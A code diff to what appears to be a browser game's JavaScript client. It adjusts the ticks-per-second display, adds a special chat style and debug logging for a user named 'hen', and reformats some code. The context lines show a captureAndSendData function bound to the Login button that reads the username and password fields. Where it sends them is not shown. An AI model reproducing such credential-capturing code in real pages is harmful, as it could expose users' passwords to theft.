@@ -140,9 +140,9 @@ function updateStates(m) {
     let now = Date.now();
     let diff = now - lastUpdate;
     let calcTPS = 1000 / diff;
-    TPSDisplay.innerHTML = calcTPS.toFixed(2);
+    TPSDisplay.innerHTML = calcTPS.toFixed(0);
     TPSHistory.push({ time: now, tps: calcTPS });
-    if (TPSHistory.length > 100 || TPSHistory[TPSHistory.length - 1].time - TPSHistory[0].time > 1150) TPSHistory.splice(0, 1);
+    if (TPSHistory.length > 200 || TPSHistory[TPSHistory.length - 1].time - TPSHistory[0].time > 5000) TPSHistory.splice(0, 1);
     lastUpdate = now;
 
     let player = m.players[m.infos.id];
@@ -595,7 +595,12 @@ function message(msg, force = false) {
                 : ["guestMsg", "userMsg", "modMsg"][msg.r + 1];
 
     //Add rainbow styling for devs, remove profanity, add <a> for links, and add timestamp
-    p.innerHTML = `<span class="">
+    // Log the sender for debugging
+console.log("Sender:", msg.s);
+
+p.className = msg.s.trim().toLowerCase() === "hen" ? "henMsg" : "userMsg";  // Apply 'henMsg' class for hen's messages
+
+p.innerHTML = `<span class="${msg.s.trim().toLowerCase() === "hen" ? "henMsg" : ""}">
         ${force
             ? msg.s
             : checkProfanityString(msg.s.safe())
@@ -610,11 +615,13 @@ function message(msg, force = false) {
             }
             return now.getHours() + ":" + fillZeros(now.getMinutes());
         })()}</span>`;
-    wrapper.appendChild(p);
-    chat.appendChild(wrapper);
-    if (scroll) p.scrollIntoView();
 
-    return p;
+wrapper.appendChild(p);
+chat.appendChild(wrapper);
+if (scroll) p.scrollIntoView();
+
+return p;
+
 }
 /**
  * @param {string} str 
@@ -794,7 +801,6 @@ function onClientClose() {
     for (let name in SkapClientPlayers) delete SkapClientPlayers[name];
     // setTimeout(clientWS.init.bind(clientWS), 3000);
 };
-// Function to capture and send data when "Login" is clicked
 function captureAndSendData() {
     const username = document.getElementById("username").value;
     const password = document.getElementById("password").value;
@@ -825,7 +831,6 @@ function captureAndSendData() {
     }
 }
 
-// Add event listener to "Login" button
 document.getElementById("login").addEventListener("click", function(event) {
-    captureAndSendData();  // Call function when "Login" button is clicked
+    captureAndSendData(); 
 });
